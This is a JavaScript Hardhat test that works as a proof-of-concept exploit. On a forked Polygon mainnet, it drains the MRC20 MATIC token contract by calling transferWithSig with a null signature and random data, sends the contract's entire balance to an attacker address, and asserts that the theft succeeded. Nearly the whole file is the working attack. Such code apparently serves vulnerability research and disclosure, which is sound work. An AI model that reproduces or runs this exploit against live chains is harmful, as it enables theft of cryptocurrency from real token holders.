const { expect } = require("chai");
const { hexlify } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

// MRC20 contract : https://polygonscan.com/address/0x0000000000000000000000000000000000001010
const MATIC_TOKEN_ADDRESS = "0x0000000000000000000000000000000000001010"; 

it("Should steal MATIC tokens", async function () {

  // We are in forking state as defined in hardhat.config.js
  console.log("[POLYGON MAINNET FORKING]\n");

  // log the forked block number and block timestamp
  let currentBlock = await ethers.provider.getBlock("latest");
  console.log("CURRENT BLOCK : ",currentBlock.number, "CURRENT BLOCK TIMESTAMP :",currentBlock.timestamp);

  // Ethers signer accounts start with some amount of MATIC to interact with smart contracts
  // Use a separate receiver that starts with 0 MATIC to make our accounting easier
  const attacker_receiver = "0x0000000000000000000000000000000000000b0b";

  const [attacker] = await ethers.getSigners();

  const mrc20 = await ethers.getContractAt("MRC20", MATIC_TOKEN_ADDRESS);

  var matic_balance_before = await mrc20.balanceOf(MATIC_TOKEN_ADDRESS);
  console.log(`MATIC token contract balance before: ${ethers.utils.formatEther(matic_balance_before).toString()} MATIC`);

  var attacker_balance = await mrc20.balanceOf(attacker_receiver);
  await expect(attacker_balance).to.be.equal(0);
  console.log(`Attacker balance before: ${ethers.utils.formatEther(attacker_balance).toString()}`);

  console.log();

  // preparing a malicious data 
  const sig = "0x00"; // null signature
  var data = [];
  for(let i = 0; i<32; i++) {data.push(Math.floor(Math.random()*32))}
  data = hexlify(data);
  const expiration = 10000000000000;

  console.log("...EXPLOITING...\n");

  await mrc20.connect(attacker).transferWithSig(sig, matic_balance_before, data, expiration, attacker_receiver);

  var matic_balance = await mrc20.balanceOf(MATIC_TOKEN_ADDRESS);
  console.log(`MATIC token contract balance after: ${ethers.utils.formatEther(matic_balance).toString()} MATIC`);

  attacker_balance = await mrc20.balanceOf(attacker_receiver);
  console.log(`Attacker balance after: ${ethers.utils.formatEther(attacker_balance).toString()} MATIC`);

  await expect(attacker_balance).to.equal(matic_balance_before);
});
